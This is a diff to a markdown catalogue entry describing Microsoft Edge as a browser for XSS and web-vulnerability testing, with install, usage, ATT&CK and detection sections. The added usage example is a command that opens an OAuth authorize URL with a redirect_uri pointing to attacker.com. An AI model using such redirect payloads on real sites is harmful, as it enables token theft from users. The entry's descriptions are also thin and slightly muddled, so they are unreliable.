@@ -1,6 +1,5 @@
 ---
-id: tool-edge
-url: 'https://www.microsoft.com/edge'
+url: 'https://www.microsoft.com/en-us/edge'
 tags:
   - browser
 type: tool
@@ -8,7 +7,8 @@ verified: false
 platforms:
   - Web
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T00:11:09.160Z'
+updated_at: '2025-12-14T17:24:31.299Z'
+id: 8fe1407b-2efd-4c6c-8c1f-33653eda5265
 validated: true
 submitted: true
 ---
@@ -18,17 +18,16 @@ submitted: true
 
 ## Overview
 
-Microsoft Edge (legacy Chromium-based) is a browser for reproducing XSS by loading URLs and checking JS execution, bridging modern and legacy testing.
+Microsoft Edge (legacy Blink-based) for web vuln testing.
 
 ## Description
 
-Edge's DevTools mirror Chrome's, aiding in inspection of network fetches and script injections for web vuln validation.
+Tests XSS in Chromium engine variant.
 
 ## Features
 
-- Feature 1: F12 tools
-- Feature 2: Extensions
-- Feature 3: IE mode for legacy
+- Feature 1: DevTools
+- Feature 2: F12 tools
 
 ## Installation
 
@@ -39,12 +38,14 @@ Edge's DevTools mirror Chrome's, aiding in inspection of network fetches and scr
 ### Install Commands
 
 ```bash
-# Pre-installed or download from Microsoft
+# Pre-installed; update via Settings
 ```
 
 ## Basic Usage
 
-Launch Edge and load URL.
+```bash
+start microsoft-edge:https://www.mapbox.com/authorize/?redirect_uri=https://attacker.com/malicious.json
+```
 
 ### Common Options
 
@@ -56,11 +57,9 @@ Launch Edge and load URL.
 
 ### Example 1: Basic Usage
 
-Navigate to malicious URL in Edge.
+Launch and load URL.
 
 ## MITRE ATT&CK Mapping
-
-This tool is commonly associated with:
 
 ### Techniques
 
@@ -72,9 +71,7 @@ This tool is commonly associated with:
 
 ## Detection
 
-Indicators and methods for detecting this tool's usage:
-
-- User-agent: Edge/...
+- Edge user-agent
 
 ## Related Procedures
 
@@ -85,4 +82,4 @@ Indicators and methods for detecting this tool's usage:
 
 ## References
 
-- Official documentation: https://www.microsoft.com/edge
+- https://docs.microsoft.com/en-us/microsoft-edge/
